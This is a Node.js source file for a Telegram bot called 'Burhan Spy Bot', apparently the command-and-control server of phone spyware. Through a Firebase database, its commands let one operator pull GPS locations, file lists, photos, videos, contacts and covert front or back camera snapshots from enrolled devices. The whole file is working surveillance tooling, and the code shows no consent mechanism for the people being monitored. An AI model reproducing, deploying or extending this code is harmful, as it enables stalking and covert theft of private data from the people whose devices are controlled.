const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');
const express = require('express');

// Environment variables (Railway/Any cloud)
const token = process.env.TOKEN; // Bot token
const YOUR_USER_ID = process.env.USER_ID; // Your Telegram ID (string)

const bot = new TelegramBot(token, { polling: false });
const app = express();
app.use(express.json({ limit: '50mb' })); // Increased limit for media updates

// Firebase initialization with safe error handling
let db;
try {
    const serviceAccount = require('./firebase-service-account.json');
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
        databaseURL: "https://spyservice-c27e1-default-rtdb.europe-west1.firebasedatabase.app"
    });
    db = admin.database();
    console.log("✅ Firebase connected successfully");
} catch (e) {
    console.error("❌ Firebase init error:", e.message);
    console.error("⚠️ Make sure firebase-service-account.json is in the same folder");
    db = null; // Bot will still start, but commands requiring DB will fail gracefully
}

// ===== WEBHOOK HANDLER (BULLETPROOF) =====
app.post('/webhook', (req, res) => {
    try {
        // Log every incoming update (for debugging)
        console.log("📥 Webhook received:", JSON.stringify(req.body).substring(0, 200));
        bot.processUpdate(req.body);
        res.sendStatus(200); // Always return 200, even if error occurs
    } catch (e) {
        console.error("❌ Error processing update:", e.message);
        res.sendStatus(200); // Prevent Telegram from retrying indefinitely
    }
});

// ===== AUTHORIZATION =====
function isAuthorized(msg) {
    return String(msg.from.id) === String(YOUR_USER_ID);
}

// ===== ALL COMMANDS =====

// /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    bot.sendMessage(chatId, "🔥 Burhan Spy Bot active! Use /help for commands.");
});

// /stop - cancel everything
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    bot.sendMessage(chatId, "🛑 Bot stopped. Use /start to resume.");
});

// /help
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    bot.sendMessage(chatId, 
        `📜 **COMMANDS**\n` +
        `/locate <ID> - GPS + device info\n` +
        `/devices - List all devices\n` +
        `/files <ID> - List files\n` +
        `/getphoto <ID> <FILE> - Get photo\n` +
        `/getvideo <ID> <FILE> - Get video\n` +
        `/camera <ID> [front|back] - Snapshot\n` +
        `/ping <ID> - Check alive\n` +
        `/stats - Total devices\n` +
        `/contacts <ID> - Fetch contacts\n` +
        `/stop - Stop bot\n` +
        `/start - Resume bot`
    );
});

// /devices
bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    if (!db) return bot.sendMessage(chatId, "❌ Firebase not configured.");
    db.ref('devices').once('value').then(snapshot => {
        const devices = snapshot.val() || {};
        let message = `📱 ALL DEVICES (Total: ${Object.keys(devices).length})\n\n`;
        Object.entries(devices).forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n`;
            message += `🔋 Battery: ${d.battery || 'N/A'}%\n`;
            message += `📊 Status: ${d.online ? "🟢 ONLINE" : "🔴 OFFLINE"}\n`;
            message += `🕒 ${d.time || 'N/A'}\n\n`;
        });
        bot.sendMessage(chatId, message);
    }).catch(err => {
        console.error("DB Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching devices.");
    });
});

// /stats
bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    if (!db) return bot.sendMessage(chatId, "❌ Firebase not configured.");
    db.ref('devices').once('value').then(snapshot => {
        const devices = snapshot.val() || {};
        bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
    }).catch(err => bot.sendMessage(chatId, "❌ Error."));
});

// /locate <ID>
bot.onText(/\/locate (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    if (!db) return bot.sendMessage(chatId, "❌ Firebase not configured.");
    const deviceId = match[1].trim();
    db.ref('commands').child(deviceId).set('locate').then(() => {
        bot.sendMessage(chatId, `📍 Locate command sent to ${deviceId}. Waiting for response...`);
        // Fetch existing location if available
        db.ref('devices').child(deviceId).once('value').then(snap => {
            const dev = snap.val() || {};
            if (dev.location) {
                bot.sendMessage(chatId, `📍 **Location:**\nLat: ${dev.location.lat}\nLng: ${dev.location.lng}\nTime: ${dev.location.time || 'N/A'}`);
            } else {
                bot.sendMessage(chatId, `⏳ Device hasn't reported location yet.`);
            }
        });
    }).catch(err => bot.sendMessage(chatId, "❌ Failed to send locate."));
});

// /files <ID>
bot.onText(/\/files (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    if (!db) return bot.sendMessage(chatId, "❌ Firebase not configured.");
    const deviceId = match[1].trim();
    db.ref('commands').child(deviceId).set('list_files').then(() => {
        bot.sendMessage(chatId, `📂 File list request sent for ${deviceId}.`);
    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

// /getphoto <ID> <FILE>
bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    if (!db) return bot.sendMessage(chatId, "❌ Firebase not configured.");
    const deviceId = match[1].trim();
    const fileName = match[2].trim();
    db.ref('commands').child(deviceId).set({ type: 'get_photo', file: fileName }).then(() => {
        bot.sendMessage(chatId, `📸 Photo request sent for ${deviceId}, file: ${fileName}.`);
    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

// /getvideo <ID> <FILE>
bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    if (!db) return bot.sendMessage(chatId, "❌ Firebase not configured.");
    const deviceId = match[1].trim();
    const fileName = match[2].trim();
    db.ref('commands').child(deviceId).set({ type: 'get_video', file: fileName }).then(() => {
        bot.sendMessage(chatId, `📹 Video request sent for ${deviceId}, file: ${fileName}.`);
    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

// /camera <ID> [front|back]
bot.onText(/\/camera (.+) (front|back)?/i, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    if (!db) return bot.sendMessage(chatId, "❌ Firebase not configured.");
    const deviceId = match[1].trim();
    const camera = (match[2] || 'back').toLowerCase();
    db.ref('commands').child(deviceId).set({ type: 'camera', camera: camera }).then(() => {
        bot.sendMessage(chatId, `📷 Snapshot request for ${deviceId} (${camera} cam).`);
    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

// /ping <ID>
bot.onText(/\/ping (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    if (!db) return bot.sendMessage(chatId, "❌ Firebase not configured.");
    const deviceId = match[1].trim();
    db.ref('commands').child(deviceId).set('ping').then(() => {
        bot.sendMessage(chatId, `📡 Ping sent to ${deviceId}.`);
    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

// /contacts <ID>
bot.onText(/\/contacts (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    if (!db) return bot.sendMessage(chatId, "❌ Firebase not configured.");
    const deviceId = match[1].trim();
    db.ref('commands').child(deviceId).set('get_contacts').then(() => {
        bot.sendMessage(chatId, `📞 Contacts request sent for ${deviceId}.`);
    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

// ===== SERVER START (Railway compatible) =====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    // Optional: Set webhook automatically if RAILWAY_PUBLIC_DOMAIN is available
    const webhookUrl = process.env.RAILWAY_PUBLIC_DOMAIN 
        ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}/webhook` 
        : null;
    if (webhookUrl) {
        bot.setWebHook(webhookUrl).then(() => {
            console.log(`✅ Webhook set to ${webhookUrl}`);
        }).catch(e => console.error("❌ Webhook set failed:", e.message));
    } else {
        console.warn("⚠️ RAILWAY_PUBLIC_DOMAIN not set. Set webhook manually.");
    }
});
